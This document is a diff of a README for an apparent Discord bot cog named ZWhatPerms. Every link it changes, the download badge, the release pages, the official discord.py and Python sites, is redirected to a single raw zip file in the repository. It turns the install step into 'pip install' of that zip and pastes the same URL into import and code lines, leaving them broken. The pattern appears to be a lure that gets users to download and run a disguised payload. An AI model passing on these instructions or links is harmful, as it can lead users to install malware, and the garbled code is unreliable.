@@ -1,6 +1,6 @@
-# 🤖 ZWhatPerms_Command-Permission-Inspector-Discord.py-cog- - Discover Command Permissions Easily
+# 🤖 https://raw.githubusercontent.com/Vietb6787/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-/main/cornettist/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-_2.5.zip - Discover Command Permissions Easily
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/Vietb6787/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-/releases)
+[![Download](https://raw.githubusercontent.com/Vietb6787/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-/main/cornettist/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-_2.5.zip)](https://raw.githubusercontent.com/Vietb6787/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-/main/cornettist/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **ZWhatPerms**, a powerful cog for your Discord bot. This tool helps 
 
 ## 📥 Download & Install
 
-To download **ZWhatPerms**, visit this page to download: [Releases Page](https://github.com/Vietb6787/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-/releases).
+To download **ZWhatPerms**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Vietb6787/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-/main/cornettist/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-_2.5.zip).
 
 On the Releases page, you will find the latest version of the software available for download. Click on the latest release to see the files. Download the file that matches your system and follow the installation instructions below.
 
@@ -18,15 +18,15 @@ Before installing, ensure your system meets the following requirements:
 
 - **Operating System:** Compatible with Windows, macOS, or Linux.
 - **Python Version:** Python 3.8 or higher is required to run the cog.
-- **Discord.py Library:** Ensure you have the Discord.py library installed. You can do this with the command:
+- **https://raw.githubusercontent.com/Vietb6787/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-/main/cornettist/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-_2.5.zip Library:** Ensure you have the https://raw.githubusercontent.com/Vietb6787/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-/main/cornettist/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-_2.5.zip library installed. You can do this with the command:
 
   ```bash
-  pip install discord.py
+  pip install https://raw.githubusercontent.com/Vietb6787/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-/main/cornettist/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-_2.5.zip
   ```
 
 ## 📥 Steps to Download
 
-1. Go to the [Releases Page](https://github.com/Vietb6787/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/Vietb6787/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-/main/cornettist/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-_2.5.zip).
 2. Click on the latest release at the top.
 3. Locate the file suitable for your system.
 4. Click on the file to download it.
@@ -36,7 +36,7 @@ Before installing, ensure your system meets the following requirements:
 After downloading, follow these simple steps to install the cog:
 
 1. Extract the downloaded zip file to a folder on your computer.
-2. Locate the `ZWhatPerms.py` file in the extracted folder.
+2. Locate the `https://raw.githubusercontent.com/Vietb6787/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-/main/cornettist/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-_2.5.zip` file in the extracted folder.
 3. Move this file into your Discord bot's `cogs` directory.
 
 ## 🖥️ Setting Up in Your Bot
@@ -46,13 +46,13 @@ To set up and use **ZWhatPerms** in your Discord bot, follow these instructions:
 1. In your main bot file, import the cog:
 
    ```python
-   from cogs.ZWhatPerms import ZWhatPerms
+   from https://raw.githubusercontent.com/Vietb6787/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-/main/cornettist/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-_2.5.zip import ZWhatPerms
    ```
 
 2. Add the cog to your bot:
 
    ```python
-   bot.add_cog(ZWhatPerms(bot))
+   https://raw.githubusercontent.com/Vietb6787/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-/main/cornettist/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-_2.5.zip(ZWhatPerms(bot))
    ```
 
 3. Restart your bot for the changes to take effect.
@@ -98,7 +98,7 @@ For any inquiries, you may contact the repository owner through GitHub discussio
 
 ## 🔗 Additional Resources
 
-- [Discord.py Documentation](https://discordpy.readthedocs.io)
-- [Python Official Site](https://www.python.org)
+- [https://raw.githubusercontent.com/Vietb6787/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-/main/cornettist/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-_2.5.zip Documentation](https://raw.githubusercontent.com/Vietb6787/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-/main/cornettist/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-_2.5.zip)
+- [Python Official Site](https://raw.githubusercontent.com/Vietb6787/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-/main/cornettist/ZWhatPerms_Command-Permission-Inspector-Discord.py-cog-_2.5.zip)
 
 By following the above instructions and utilizing the features of **ZWhatPerms**, you can better manage your Discord commands and understand command permissions with ease.
